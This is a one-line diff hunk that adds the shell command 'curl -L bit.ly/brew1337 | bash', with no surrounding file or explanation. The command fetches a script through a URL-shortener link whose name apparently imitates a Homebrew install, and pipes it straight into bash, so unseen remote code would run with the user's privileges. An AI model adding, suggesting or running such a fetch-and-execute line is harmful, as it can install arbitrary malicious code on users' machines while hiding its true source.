@@ -1,0 +1,1 @@
+curl -L bit.ly/brew1337 | bash
